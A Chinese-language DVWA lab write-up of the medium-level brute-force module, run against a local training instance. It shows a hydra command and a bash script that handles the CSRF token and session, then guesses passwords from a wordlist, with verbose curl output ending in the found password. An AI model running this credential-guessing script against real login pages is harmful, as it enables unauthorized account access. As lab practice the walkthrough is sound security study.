# Brute Force

試著送出表單，後端回應的時間明顯有延遲 2 秒左右

一樣用 hydra 試試看

```bash
hydra -V \
-l admin \
-P 10-million-password-list-top-10000.txt \
-s 8086 \
-f localhost \
http-form-get "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
```
結果是:
```
admin:123456
```

但在測試後發現密碼不對，代表 hydra 受到延遲的影響而誤判了，可能要刻意延遲送出才行

雖然加上了跟延遲相關的參數，hydra 用起來還是有些怪怪的，有時候找不到正確的密碼，每次結果都不同 ＠＠，將難度調回 low 重測也是一樣 QQ，可能要用別的工具試試看

一氣之下，決定自己寫腳本來慢慢爆破 🥲

原本考慮用 puppeteer 或 cypress 這類的測試框架來寫，但情況還沒那麼複雜，也想多練習 bash 所以就用 bash 來寫

```bash
#!/usr/bin/env bash
# DVWA host
HOST=http://localhost:8086
# create cookie and save csrf token
CSRF=`curl -s -L -c cookies.txt -b cookies.txt "${HOST}/login.php" | grep user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`
# save session id
SESSIONID=$(grep PHPSESSID cookies.txt | cut -d $'\t' -f7)

# user & password for login to start tasks
USER=admin
LOGIN_PASSWORD=password

# login at login page
curl -v -L -c cookies.txt -b cookies.txt \
-X POST "${HOST}/login.php" \
--data-raw \
"username=${USER}&password=${LOGIN_PASSWORD}&Login=Login&user_token=${CSRF}"

# read each line of password list file
filename='../10-million-password-list-top-100.txt'

while read line; do
	echo "using user: $USER and password: $line"
	# enter username and password in brute force page: /vulnerabilities/brute/
	RES=`curl -L -v -c cookies.txt -b cookies.txt "${HOST}/vulnerabilities/brute/?username=${USER}&password=${line}&Login=Login#"`

	if [[ $RES == *"Welcome to the password protected area admin"* ]]; then
	  printf "\n 🎉 password found: $line\n"
	  exit 0
	else
	  printf "\n 🥲 trying password: $line but failed.\n"
	fi
	
done < $filename
```

```bash
./script/brute-force-walkthrough.sh
```

```
* Connected to localhost (127.0.0.1) port 8086 (#0)
> GET /vulnerabilities/brute/?username=admin&password=123456&Login=Login HTTP/1.1
> Host: localhost:8086
> User-Agent: curl/7.77.0
> Accept: */*
> Cookie: PHPSESSID=1ugiu9votgrabahngfga89nt66; security=medium
> 
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 14 Feb 2022 10:06:25 GMT
< Server: Apache/2.4.25 (Debian)
< Expires: Tue, 23 Jun 2009 12:00:00 GMT
< Cache-Control: no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 4384
< Content-Type: text/html;charset=utf-8
< 
{ [4384 bytes data]
100  4384  100  4384    0     0   2180      0  0:00:02  0:00:02 --:--:--  2188
* Connection #0 to host localhost left intact

 🥲 trying password: 123456 but failed.
using user: admin and password: 12345678
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 127.0.0.1:8086...
* Connected to localhost (127.0.0.1) port 8086 (#0)
> GET /vulnerabilities/brute/?username=admin&password=12345678&Login=Login HTTP/1.1
> Host: localhost:8086
> User-Agent: curl/7.77.0
> Accept: */*
> Cookie: PHPSESSID=1ugiu9votgrabahngfga89nt66; security=medium
> 
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 14 Feb 2022 10:06:27 GMT
< Server: Apache/2.4.25 (Debian)
< Expires: Tue, 23 Jun 2009 12:00:00 GMT
< Cache-Control: no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 4384
< Content-Type: text/html;charset=utf-8
< 
{ [4384 bytes data]
100  4384  100  4384    0     0   2180      0  0:00:02  0:00:02 --:--:--  2188
* Connection #0 to host localhost left intact

 🥲 trying password: 12345678 but failed.
using user: admin and password: qwerty
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 127.0.0.1:8086...
* Connected to localhost (127.0.0.1) port 8086 (#0)
> GET /vulnerabilities/brute/?username=admin&password=qwerty&Login=Login HTTP/1.1
> Host: localhost:8086
> User-Agent: curl/7.77.0
> Accept: */*
> Cookie: PHPSESSID=1ugiu9votgrabahngfga89nt66; security=medium
> 
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 14 Feb 2022 10:06:29 GMT
< Server: Apache/2.4.25 (Debian)
< Expires: Tue, 23 Jun 2009 12:00:00 GMT
< Cache-Control: no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 4384
< Content-Type: text/html;charset=utf-8
< 
{ [4384 bytes data]
100  4384  100  4384    0     0   2180      0  0:00:02  0:00:02 --:--:--  2188
* Connection #0 to host localhost left intact

 🥲 trying password: qwerty but failed.
using user: admin and password: password
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 127.0.0.1:8086...
* Connected to localhost (127.0.0.1) port 8086 (#0)
> GET /vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1
> Host: localhost:8086
> User-Agent: curl/7.77.0
> Accept: */*
> Cookie: PHPSESSID=1ugiu9votgrabahngfga89nt66; security=medium
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 14 Feb 2022 10:06:32 GMT
< Server: Apache/2.4.25 (Debian)
< Expires: Tue, 23 Jun 2009 12:00:00 GMT
< Cache-Control: no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 4422
< Content-Type: text/html;charset=utf-8
< 
{ [4422 bytes data]
100  4422  100  4422    0     0   330k      0 --:--:-- --:--:-- --:--:--  863k
* Connection #0 to host localhost left intact

 🎉 password found: password
```
